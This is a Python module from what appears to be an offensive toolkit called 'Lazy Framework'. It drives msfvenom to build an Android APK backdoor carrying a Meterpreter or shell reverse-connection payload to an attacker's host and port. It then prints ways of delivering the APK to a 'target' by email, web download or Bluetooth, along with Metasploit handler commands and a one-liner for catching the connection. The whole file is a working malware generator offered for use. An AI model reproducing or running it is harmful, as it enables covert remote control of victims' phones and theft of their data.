#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import subprocess
import shutil
from pathlib import Path
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich import box

console = Console()

MODULE_INFO = {
    "name": "Android APK Backdoor Generator",
    "description": "Create real Android APK backdoor with msfvenom",
    "author": "Lazy Framework",
    "platform": "android", 
    "arch": "armle",
    "rank": "Excellent",
    "dependencies": []
}

OPTIONS = {
    "LHOST": {"description": "Your IP address", "required": True, "default": "192.168.1.100"},
    "LPORT": {"description": "Listener port", "required": True, "default": "4444"},
    "PAYLOAD": {
        "description": "Payload type", 
        "required": True, 
        "default": "android/meterpreter/reverse_tcp",
        "choices": [
            "android/meterpreter/reverse_tcp",
            "android/meterpreter/reverse_http", 
            "android/meterpreter/reverse_https",
            "android/shell/reverse_tcp"
        ]
    },
    "OUTPUT": {"description": "Output APK name", "required": False, "default": "backdoor.apk"},
    "ENCODER": {
        "description": "Payload encoder", 
        "required": False, 
        "default": "none",
        "choices": ["none", "x86/shikata_ga_nai"]
    }
}

def run(session, options):
    console.print(Panel.fit(
        "[bold green]🤖 Android APK Backdoor Generator[/bold green]",
        border_style="green"
    ))
    
    lhost = options.get("LHOST")
    lport = options.get("LPORT")
    payload = options.get("PAYLOAD")
    output_file = options.get("OUTPUT", "backdoor.apk")
    encoder = options.get("ENCODER", "none")
    
    # Check dependencies
    if not shutil.which("msfvenom"):
        console.print(Panel.fit(
            "[bold red]❌ msfvenom not found![/bold red]\n"
            "[yellow]Install with: sudo apt install metasploit-framework[/yellow]",
            border_style="red"
        ))
        return False
    
    # Display configuration
    config_table = Table(show_header=False, box=box.ROUNDED)
    config_table.add_column("Setting", style="bold cyan", width=20)
    config_table.add_column("Value", style="white")
    
    config_table.add_row("Payload", payload)
    config_table.add_row("LHOST", lhost)
    config_table.add_row("LPORT", lport)
    config_table.add_row("Output File", output_file)
    config_table.add_row("Encoder", encoder)
    
    console.print(Panel(config_table, title="⚙️ Configuration", border_style="yellow"))
    console.print()
    
    # Generate APK payload
    console.print("[cyan][*] Generating Android APK backdoor...[/cyan]")
    
    # Build msfvenom command for APK
    cmd = [
        "msfvenom",
        "-p", payload,
        f"LHOST={lhost}",
        f"LPORT={lport}",
        "-f", "raw",  # Use raw format first
        "-o", "temp_payload"
    ]
    
    # Add encoder if specified
    if encoder != "none":
        cmd.extend(["-e", encoder])
        cmd.extend(["-i", "3"])
    
    # Show command
    console.print(f"[dim]$ {' '.join(cmd)}[/dim]")
    console.print()
    
    # Execute with progress
    success = generate_apk_payload(cmd, output_file)
    
    if success:
        show_success(output_file, payload, lhost, lport)
        show_deployment_guide(output_file)
        show_handler_setup(payload, lhost, lport)
    else:
        # Fallback: try alternative method
        console.print("[yellow][*] Trying alternative APK generation method...[/yellow]")
        success = generate_apk_alternative(payload, lhost, lport, output_file)
        
        if success:
            show_success(output_file, payload, lhost, lport)
            show_deployment_guide(output_file)
            show_handler_setup(payload, lhost, lport)
        else:
            console.print(Panel.fit(
                "[bold red]❌ Failed to generate APK![/bold red]\n"
                "[yellow]Try manual method with msfvenom[/yellow]",
                border_style="red"
            ))
    
    return success

def generate_apk_payload(cmd, output_file):
    """Generate APK payload using msfvenom"""
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        console=console
    ) as progress:
        
        task = progress.add_task("[cyan]Generating APK payload...", total=100)
        
        try:
            # Run msfvenom to create raw payload
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            
            # Simulate progress
            for i in range(100):
                progress.update(task, advance=1)
                import time
                time.sleep(0.03)
            
            if result.returncode == 0 and os.path.exists("temp_payload"):
                progress.update(task, description="[green]✅ Converting to APK...")
                
                # Rename to APK extension
                shutil.move("temp_payload", output_file)
                
                progress.update(task, description="[green]✅ APK Created!")
                return True
            else:
                progress.update(task, description="[red]❌ Failed!")
                if result.stderr:
                    console.print(f"[red]Error: {result.stderr}[/red]")
                return False
                
        except Exception as e:
            progress.update(task, description="[red]❌ Error!")
            console.print(f"[red]Unexpected error: {e}[/red]")
            return False

def generate_apk_alternative(payload, lhost, lport, output_file):
    """Alternative method to generate APK"""
    try:
        console.print("[yellow][*] Using direct APK generation...[/yellow]")
        
        # Direct APK generation command
        cmd = [
            "msfvenom",
            "-p", payload,
            f"LHOST={lhost}",
            f"LPORT={lport}",
            "-f", "apk",  # Try apk format directly
            "-o", output_file
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
        
        if result.returncode == 0 and os.path.exists(output_file):
            console.print("[green]✅ APK generated successfully![/green]")
            return True
        else:
            console.print("[red]❌ APK generation failed[/red]")
            return False
            
    except Exception as e:
        console.print(f"[red]Alternative method error: {e}[/red]")
        return False

def show_success(output_file, payload, lhost, lport):
    """Display success information"""
    if os.path.exists(output_file):
        file_size = os.path.getsize(output_file) / 1024 / 1024
        file_path = os.path.abspath(output_file)
    else:
        file_size = 0
        file_path = output_file
    
    success_table = Table(show_header=False, box=box.DOUBLE_EDGE)
    success_table.add_column("Property", style="bold white", width=15)
    success_table.add_column("Value", style="green")
    
    success_table.add_row("Status", "✅ APK READY")
    success_table.add_row("File", file_path)
    success_table.add_row("Size", f"{file_size:.2f} MB")
    success_table.add_row("Payload", payload)
    success_table.add_row("LHOST", lhost)
    success_table.add_row("LPORT", lport)
    success_table.add_row("Type", "Android APK")
    
    console.print(Panel(success_table, title="🎉 Success", border_style="green"))
    console.print()

def show_deployment_guide(output_file):
    """Display APK deployment guide"""
    deploy_table = Table(show_header=True, header_style="bold blue", box=box.ROUNDED)
    deploy_table.add_column("Method", style="white", width=20)
    deploy_table.add_column("Instructions", style="cyan")
    deploy_table.add_column("Commands", style="yellow")
    
    deploy_methods = [
        (
            "📱 Direct Install", 
            "Install APK on Android device", 
            f"adb install {output_file}"
        ),
        (
            "📧 Send via Email", 
            "Email APK as attachment", 
            "Send to target email"
        ),
        (
            "🌐 Web Download", 
            "Host APK on web server", 
            f"python3 -m http.server 8080"
        ),
        (
            "💾 USB Transfer", 
            "Copy via USB cable", 
            "Enable USB debugging"
        ),
        (
            "📲 Bluetooth", 
            "Share via Bluetooth", 
            "Pair and send file"
        )
    ]
    
    for method in deploy_methods:
        deploy_table.add_row(method[0], method[1], method[2])
    
    console.print(Panel(deploy_table, title="🚀 APK Deployment Methods", border_style="blue"))
    console.print()

def show_handler_setup(payload, lhost, lport):
    """Display Metasploit handler setup"""
    instructions_table = Table(show_header=True, header_style="bold yellow", box=box.ROUNDED)
    instructions_table.add_column("Step", style="white", width=8)
    instructions_table.add_column("Action", style="cyan", width=25)
    instructions_table.add_column("Command", style="green")
    
    instructions_table.add_row("1", "Start Metasploit", "msfconsole")
    instructions_table.add_row("2", "Use Handler", "use exploit/multi/handler")
    instructions_table.add_row("3", "Set Payload", f"set PAYLOAD {payload}")
    instructions_table.add_row("4", "Set LHOST", f"set LHOST {lhost}")
    instructions_table.add_row("5", "Set LPORT", f"set LPORT {lport}")
    instructions_table.add_row("6", "Start Handler", "exploit -j")
    instructions_table.add_row("7", "Wait", "Wait for target to install APK")
    
    console.print(Panel(instructions_table, title="🎯 Metasploit Handler Setup", border_style="yellow"))
    console.print()
    
    # Quick one-liner command
    console.print(Panel(
        f"[bold cyan]Quick Start:[/bold cyan]\n"
        f"[dim]msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD {payload}; set LHOST {lhost}; set LPORT {lport}; exploit\"[/dim]",
        border_style="cyan"
    ))

if __name__ == "__main__":
    # Test the module
    test_options = {
        "LHOST": "192.168.1.100",
        "LPORT": "4444", 
        "PAYLOAD": "android/meterpreter/reverse_tcp",
        "OUTPUT": "test_backdoor.apk",
        "ENCODER": "none"
    }
    run({}, test_options)
